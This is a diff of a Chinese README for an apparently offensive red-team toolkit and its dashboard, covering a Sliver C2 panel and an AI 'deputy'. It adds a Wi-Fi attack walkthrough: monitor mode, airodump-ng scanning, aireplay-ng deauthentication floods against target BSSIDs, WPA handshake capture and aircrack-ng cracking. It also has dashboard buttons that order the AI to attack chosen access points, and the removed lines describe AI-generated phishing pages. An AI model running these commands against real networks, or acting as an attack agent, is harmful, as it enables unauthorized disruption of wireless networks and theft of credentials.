@@ -26,19 +26,15 @@ cd ~/CatTeam/frontend && npx vite --port 5173
 
 | 区域 | 真实模块 | 说明 |
 |---|---|---|
-| **领航域 (Top Header)** | 全局战役管线 (CampaignPipeline) 进度发光条 | 当前战区的射频、注入、报告进度指示器。 |
+| **领航域 (Top Header)** | 全局战役管线 (CampaignPipeline) 进度发光条 | 当前战区的射频、态势、报告进度指示器。 |
 | **情境沙盒 (Center Pane)**| 【资产大表 AssetTable】与【战役看板 TheaterKanban】 | ALFA 与 NMAP 双重雷达探明的资产。 |
-| **火控挂架 (Center Top)** | **开发中：** 全局多选准星 (Global Multi-Select Reticle) | 允许在不同的资产上框选靶标。 |
-| **视觉防线 (A2UI Forge)**| AI 实时锻造引擎 (A2UIForgeModal) | 视觉层面反馈 Web 对话页面。 |
+| **全局锁定网 (Center Top)** | ✅ **已完成：** 全局多选准星 (Global Multi-Select Reticle) | 跨 IP/BSSID 多维阵列框选靶标并持续追踪。 |
 | **C2 远控桥 (Left Tab)**  | Sliver GRPC / Web 控制台 (SliverViewTab) | 后渗透 C2 端点控制。 |
-| **副官参谋 (Right Pane)** | 原生闪电大模型终端支持 (Interactions State Machine) | OSINT 字典生成与其他复杂任务辅助。 |
+| **副官参谋 (Right Pane)** | 原生闪电大模型终端支持 (Interactions State Machine) | 提供基于雷达图景的战术分析指导。 |
 
 ### [➕超纲新增] V9.0 环境壁垒 (Theater Manager)
 在启动 Web 面板后，**强烈建议第一步在顶部 Header 选择/新建 `战区 (Theater)`**。
 所有扫描仪、资产入库、AI 对话上下文，**均被 SQLite 物理隔离在您选定的战区内**，横跨星巴克与内网时绝不会出现数据串流污染！
-
-### A2UI 零日武器生成与持久化
-在主面板触发 `拦截 Beacon` 等高级对抗动作时，AI 副官会实时推送 `A2UIForgeModal` (零日钓鱼锻造仓)。后端将自动解析渲染意图，将伪造页面实装到沙盒中投递。
 
 ---
 
@@ -330,3 +326,147 @@ docker exec -it kali_arsenal /bin/bash         # 进入战车
 | Hashcat 找不到字典 | 更新 `config.sh` 中 `WORDLIST` 路径 |
 | 04 模块在 Mac 上抓不到包 | 检查 SIP 是否禁用了原始套接字 |
 | 06 凭据从哪来 | 自动从 05 的 cracked_passwords.txt 加载 |
+
+---
+
+## 场景十二：ALFA 无线射频侦察 (Monitor Mode)
+
+### 架构概览
+
+```
+┌─────────────────── MacBook Air (宿主机) ────────────────────┐
+│                                                              │
+│  [后端] uvicorn backend.main:app :8000                       │
+│  [前端] npx vite :5173 → 浏览器大屏                          │
+│                    ↑ HTTP POST (wifi 遥测)                   │
+│  ┌──────────────── Kali Linux 虚拟机 ──────────────────┐     │
+│  │                                                      │     │
+│  │  终端 1: airodump-ng wlan0mon (占满屏幕, 不能退出)   │     │
+│  │          ↓ 每3秒刷新 CSV 文件                        │     │
+│  │  终端 2: claw_wifi_sensor.py (读CSV → POST到宿主机)  │     │
+│  │                                                      │     │
+│  │  [USB 直通] ALFA 网卡 ──→ wlan0 ──→ wlan0mon         │     │
+│  └──────────────────────────────────────────────────────┘     │
+└──────────────────────────────────────────────────────────────┘
+```
+
+**为什么需要两个终端窗口？**
+
+`airodump-ng` 是一个**全屏实时刷新**的扫描程序，启动后会独占整个终端，持续显示周围的 AP 列表。它不会自动退出，也无法在同一个终端里再运行其他命令。因此必须打开**第二个终端窗口**来运行 `claw_wifi_sensor.py` 探针脚本，由它读取 `airodump-ng` 写出的 CSV 文件并把数据发送给宿主机上的后端服务。
+
+### 前置条件
+
+| 条件 | 说明 |
+|---|---|
+| Kali 虚拟机 | 已在 MacBook Air 上启动 (VMware / UTM / Parallels) |
+| ALFA 网卡 | 已通过 USB 直通 (USB Passthrough) 挂载到 Kali 虚拟机 |
+| Mac 后端服务 | `uvicorn backend.main:app --port 8000` 已在宿主机运行 |
+| Mac 前端服务 | `npx vite --port 5173` 已在宿主机运行 |
+| 探针脚本 | `claw_wifi_sensor.py` 已部署到 Kali 虚拟机 (见下方) |
+
+### 准备工作：部署探针脚本到 Kali 虚拟机
+
+`claw_wifi_sensor.py` 位于宿主机的 `~/CatTeam/CatTeam_Loot/claw_wifi_sensor.py`。首次使用前，需要将它传入 Kali 虚拟机：
+
+```bash
+# 在 Mac 宿主机上执行，将探针脚本传入 Kali
+scp ~/CatTeam/CatTeam_Loot/claw_wifi_sensor.py kali@<KALI_VM_IP>:~/claw_wifi_sensor.py
+```
+
+> 💡 如果不知道 Kali 虚拟机的 IP，可以在 Kali 虚拟机的终端中运行 `ip addr` 或 `hostname -I` 查看。
+
+### Step 1: 在 Kali 虚拟机中开启监听模式
+
+在 Kali 虚拟机的**第一个终端窗口**中：
+
+```bash
+# 杀死可能干扰 Monitor Mode 的后台服务 (NetworkManager, wpa_supplicant)
+sudo airmon-ng check kill
+
+# 将 wlan0 切换至 Monitor Mode
+# 网卡名可能是 wlan0 或 wlan1，用 iwconfig 确认
+sudo airmon-ng start wlan0
+# 成功后网卡名变为 wlan0mon
+```
+
+> ⚠️ 执行 `check kill` 会断开 Kali 虚拟机的 WiFi。如果您通过 SSH 连接 Kali，请确保 SSH 走的是**虚拟机的 NAT/桥接网络**而非 WiFi，否则连接会丢失。如果直接在虚拟机窗口中操作则无此问题。
+
+### Step 2: 启动底层雷达扫描 (Airodump-ng)
+
+仍然在**第一个终端窗口**中：
+
+```bash
+# --write-interval 3: 每 3 秒将捕获结果刷新到 CSV 文件
+# --output-format csv: 输出为纯文本 CSV（供探针脚本解析）
+# -w /tmp/target_recon: 输出文件前缀（实际生成 /tmp/target_recon-01.csv）
+sudo airodump-ng wlan0mon --write-interval 3 --output-format csv -w /tmp/target_recon
+```
+
+此时屏幕会被 airodump-ng 的实时 AP 列表**完全占满**。这是正常的。
+**保持此窗口不动，不要 Ctrl+C。**
+
+### Step 3: 打开第二个终端, 启动探针回传
+
+因为 airodump-ng 占满了第一个终端，您需要：
+- 在 Kali 虚拟机桌面中**右键打开新的终端窗口**，或者
+- 从 Mac 宿主机再 SSH 一个新会话到 Kali 虚拟机
+
+在**第二个终端窗口**中启动探针：
+
+```bash
+# 探针负责：读取 airodump 生成的 CSV → 解析 AP 信息 → POST 到 Mac 后端
+python3 ~/claw_wifi_sensor.py \
+    --csv /tmp/target_recon-01.csv \
+    --mothership http://<MAC_HOST_IP>:8000 \
+    --interval 3
+```
+
+> 💡 `<MAC_HOST_IP>` 是宿主机的 IP 地址。
+> - 如果 Kali 虚拟机用 **桥接模式 (Bridged)**：填 Mac 在局域网中的 IP（如 `192.168.1.10`）
+> - 如果用 **NAT 模式**：填虚拟机网关 IP（通常是 `10.0.2.2` 或 `192.168.x.1`，具体看虚拟化软件配置）
+
+启动成功后，探针会每 3 秒循环打印类似以下日志：
+```
+[+] Radar push successful: 12 nodes synchronized.
+```
+
+### Step 4: 在 Mac 浏览器上查看大屏
+
+1. 打开浏览器访问 `http://localhost:5173`
+2. 点击左侧 Activity Bar 的 **RF** (射频频段) 标签
+3. `RadioRadarPanel` 面板应开始每 3 秒刷新真实 AP 信号
+4. 点击任意 AP 行的复选框可将 BSSID 加入全局靶标池
+5. 点击 `[锁频截获]` 或 `[DEAUTH]` 按钮可命令 AI 副官对目标发起定向攻击
+
+### Step 5: 使用 Wireshark 深度分析 (可选)
+
+```bash
+# 在 Kali 虚拟机中直接启动 Wireshark GUI
+wireshark &
+
+# 或用 tshark 命令行抓取特定 BSSID 的握手包
+# 需要在第三个终端窗口（或在 airodump 窗口 Ctrl+C 后重新定向）
+sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w /tmp/handshake wlan0mon
+
+# 使用 aireplay-ng 发射 Deauth 强制客户端重连以获取握手包
+sudo aireplay-ng -0 10 -a <TARGET_BSSID> wlan0mon
+
+# 验证是否成功捕获 WPA 握手
+sudo aircrack-ng /tmp/handshake-01.cap
+```
+
+### Step 6: 关闭流程
+
+```bash
+# 按顺序关闭：
+# 1. 在第二个终端 Ctrl+C 停止探针 (claw_wifi_sensor.py)
+# 2. 在第一个终端 Ctrl+C 停止 airodump-ng
+# 3. 恢复网卡为正常模式
+sudo airmon-ng stop wlan0mon
+
+# 4. 重启网络服务（恢复 Kali 的普通 WiFi）
+sudo systemctl start NetworkManager
+```
+
+> ⚠️ **重要**：探针停止后，大屏 RF 面板的数据将在 5 分钟内因过期而清空。数据仍保留在 SQLite `wifi_nodes` 表中，但当前前端不展示历史数据（V9.3 将解决此问题）。
+
